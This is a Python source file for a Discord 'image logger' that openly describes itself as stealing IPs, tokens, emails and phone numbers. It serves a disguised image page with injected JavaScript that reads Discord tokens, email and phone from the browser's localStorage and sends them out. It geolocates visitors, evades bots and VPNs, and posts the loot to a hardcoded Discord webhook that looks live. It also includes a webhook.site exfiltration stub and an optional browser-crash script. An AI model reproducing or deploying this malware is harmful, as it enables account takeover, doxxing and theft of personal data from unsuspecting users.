# Discord Image Logger with Token, Email & Phone Extraction
# By DeKrypt | Modified for Token/Email/Phone extraction

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger (Token/Email/Phone Included)"
__description__ = "Steals IPs, Tokens, Emails and Mobile Numbers from Discord Browser/App"
__version__ = "v3.0 - Enhanced"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1574701547357605978/mxLMcfb_mKQMyQbyaaBKTV_hBlA4e71W199_58SGqS6eY-CdDSr9DKdPdCvfY-q5YZOT",
    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", 
    "imageArgument": True, 

    # CUSTOMIZATION #
    "username": "Token Logger", 
    "color": 0xFF0000, # Red color to indicate token theft

    # OPTIONS #
    "crashBrowser": False, 
    "accurateLocation": False, 

    "message": { 
        "doMessage": False, 
        "message": "This browser has been pwned by DeKrypt's Token Logger.", 
        "richMessage": True, 
    },

    "vpnCheck": 1, 
    "linkAlerts": True, 
    "buggedImage": True, 
    "antiBot": 1, 

    # REDIRECTION #
    "redirect": {
        "redirect": False, 
        "page": "https://spy-master-pro.onrender.com/" 
    },
}

blacklistedIPs = ("27", "104", "143", "164") 

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Logger - Error",
            "color": config["color"],
            "description": f"An error occurred!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False, extra_data = {}):
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)

    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Logger - Link Sent (Bot)",
            "color": config["color"],
            "description": f"**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    
    # Handle VPN/Bot checks
    if info.get("proxy"):
        if config["vpnCheck"] == 2: return
        if config["vpnCheck"] == 1: ping = ""

    if info.get("hosting"):
        if config["antiBot"] == 4 and not info.get("proxy"): return
        if config["antiBot"] == 3: return
        if config["antiBot"] == 2 and not info.get("proxy"): ping = ""
        if config["antiBot"] == 1: ping = ""

    os, browser = httpagentparser.simple_detect(useragent)

    # Construct Embed Description
    desc = f"""**A User Opened the Logger!**

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{str(info.get('lat'))+', '+str(info.get('lon')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise'})

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`
> **User Agent:** `{useragent}`
"""

    # Add Token/Email/Phone data if available
    if extra_data:
        desc += "\n\n**Discord Account Data:**\n"
        if extra_data.get("token"):
            desc += f"> **Token:** `{extra_data['token']}`\n"
        if extra_data.get("email"):
            desc += f"> **Email:** `{extra_data['email']}`\n"
        if extra_data.get("phone"):
            desc += f"> **Phone:** `{extra_data['phone']}`\n"
        if extra_data.get("locale"):
            desc += f"> **Locale:** `{extra_data['locale']}`\n"
        if extra_data.get("premium_type"):
            desc += f"> **Nitro Level:** `{extra_data['premium_type']}`\n"

    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Logger - IP & Token Logged",
            "color": config["color"],
            "description": desc,
        }
  ],
}

    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|BO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):

    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            # HTML Template for Token/Email/Phone Extraction
            js_extraction_code = """
<script>
async function stealData() {
    // Try to get token from localStorage
    let token = localStorage.getItem("token");
    if (!token) {
        // Fallback for newer discord versions
        const allTokens = Object.keys(localStorage).filter(key => key.startsWith("token"));
        if(allTokens.length > 0) {
            token = localStorage.getItem(allTokens[0]);
        }
    }

    // Try to get email and phone (often stored in local storage if logged in)
    let email = localStorage.getItem("email");
    let phone = localStorage.getItem("phone");
    let locale = localStorage.getItem("locale");
    let premiumType = localStorage.getItem("premium_type");

    // If standard keys fail, try to find them in any key containing 'email' or 'phone'
    if (!email) {
        for (let key in localStorage) {
            if (key.includes('email') && !key.includes('last')) {
                email = localStorage.getItem(key);
                break;
            }
        }
    }
    if (!phone) {
        for (let key in localStorage) {
            if (key.includes('phone')) {
                phone = localStorage.getItem(key);
                break;
            }
        }
    }

    if (token || email || phone) {
        fetch("https://webhook.site/YOUR-WEBHOOK-ID-HERE", {
            method: "POST",
            body: JSON.stringify({
                token: token,
                email: email,
                phone: phone,
                locale: locale,
                premium_type: premiumType
            })
        });
    }
}
stealData();
</script>
"""

            # Simplified JS for this specific logger to send directly to our webhook logic via HTML payload
            # We will inject a script that sends data to our server endpoint
            
            html_payload = f'''
<!DOCTYPE html>
<html>
<head>
<style>body {{ margin: 0; padding: 0; background-color: #2f3136; }}</style>
</head>
<body>
<div style="background-image: url('{url}'); background-position: center center; background-repeat: no-repeat; background-size: contain; width: 100vw; height: 100vh;"></div>

<script>
// Function to exfiltrate data
function sendToServer(data) {{
    fetch(window.location.href + "?data=" + encodeURIComponent(JSON.stringify(data)), {{
        method: 'GET'
    }});
}}

// Attempt to grab tokens and account info
(async () => {{
    let token = localStorage.getItem("token") || localStorage.getItem("token_guild") || localStorage.getItem("token_voice");
    if(!token) {{
        const keys = Object.keys(localStorage);
        const tokKeys = keys.filter(k => k.startsWith("token"));
        if(tokKeys.length > 0) token = localStorage.getItem(tokKeys[0]);
    }}

    let email = localStorage.getItem("email");
    let phone = localStorage.getItem("phone");
    let locale = localStorage.getItem("locale");
    let nitro = localStorage.getItem("premium_type");

    // If we found something, send it
    if(token || email || phone) {{
        sendToServer({{
            token: token,
            email: email,
            phone: phone,
            locale: locale,
            nitro: nitro
        }});
    }}
}})();
</script>
</body>
</html>
'''

            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return

            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()
                if config["buggedImage"]: self.wfile.write(binaries["loading"])
                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                return

            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                # Check if data was sent back via URL parameter (exfiltrated data)
                extra_data = {}
                if dic.get("data"):
                    try:
                        extra_data = eval(dic["data"]) # Simple eval for demo, or use json.loads if properly encoded
                    except:
                        pass
                
                # If accurate location is requested, handle GPS
                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url, extra_data = extra_data)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url, extra_data = extra_data)

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    # Replace placeholders in message if needed
                    pass 

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                else:
                    data = html_payload.encode()

                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                
                self.send_response(200)
                self.send_header('Content-type', datatype)
                self.end_headers()

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}
</script>"""
                
                self.wfile.write(data)

        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
            reportError(traceback.format_exc())

        return

    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI